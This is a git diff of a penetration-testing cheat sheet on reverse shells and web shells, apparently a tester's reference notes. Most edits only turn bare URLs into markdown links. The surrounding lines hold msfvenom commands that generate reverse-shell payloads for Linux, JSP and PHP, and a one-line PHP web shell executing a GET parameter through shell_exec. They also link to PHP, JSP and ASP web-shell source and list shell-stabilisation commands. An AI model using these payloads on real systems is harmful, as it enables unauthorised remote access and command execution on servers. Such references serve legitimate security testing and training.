@@ -73,7 +73,8 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
 ### Windows
 
 #### Powershell
-https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58
+
+[reverse PowerShell cmdline payload generator](https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58)
 
 #### x86 staged - msfvenom (Non-Meterpreter)
 
@@ -162,13 +163,13 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.js
 ```sh
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
-or  
-https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php  
-https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
+or 
+[pentest monkey php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+[php reverse shell](https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php)
 
 ## Web Shells
 
-### PHP 
+### PHP
 
 ```php
 <?php echo shell_exec($_GET['cmd']);?>
@@ -178,18 +179,17 @@ https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Rev
 
 ### JSP
 
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp  
-OR
-```sh
+ [fuzz webshell](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp)
 
+```sh
 locate cmdjsp.jsp
 ```
+
 ### ASP
 
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp  
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp  
+[cmd-asp-5.1.asp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp)\
+[cmdasp.asp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp)
 
-OR
 ```sh
 locate cmd-asp-5.1.asp
 locate cmdasp.asp
@@ -197,9 +197,8 @@ locate cmdasp.asp
 
 ### ASPX
 
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx  
+[cmdasp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx)
 
-OR
 ```
 locate cmdasp.aspx
 ```
@@ -219,7 +218,7 @@ def cmd():
 if __name__ == "__main__":
 	app.run()
 ```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
+[views](https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py)
 
 ### nodejs
 
@@ -263,3 +262,5 @@ export TERM=xterm && /usr/bin/script -qc /bin/bash /dev/null
 ```
 stty raw -echo; fg 
 ```
+
+ <!--- Last Updated July 8, 2024 --->
